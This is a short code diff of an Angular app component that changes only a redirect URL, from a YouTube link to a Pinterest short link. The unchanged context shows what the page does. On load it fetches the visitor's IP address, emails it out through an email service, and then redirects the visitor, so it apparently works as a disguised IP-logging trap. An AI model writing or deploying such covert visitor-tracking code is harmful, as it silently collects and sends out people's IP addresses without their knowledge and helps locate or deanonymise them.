@@ -17,7 +17,7 @@ export class AppComponent implements OnInit {
     this.getIp().then((ipData) => {
       this.emailService.sendEmail(ipData)
         .then(() => {
-          window.location.href = 'https://youtu.be/_PF6KSQFR8o?si=1o2LkDghkIMZuRxV'
+          window.location.href = 'https://pin.it/3ujykNp7q'
         })
         .catch((error) => {
           console.log('Failed..');
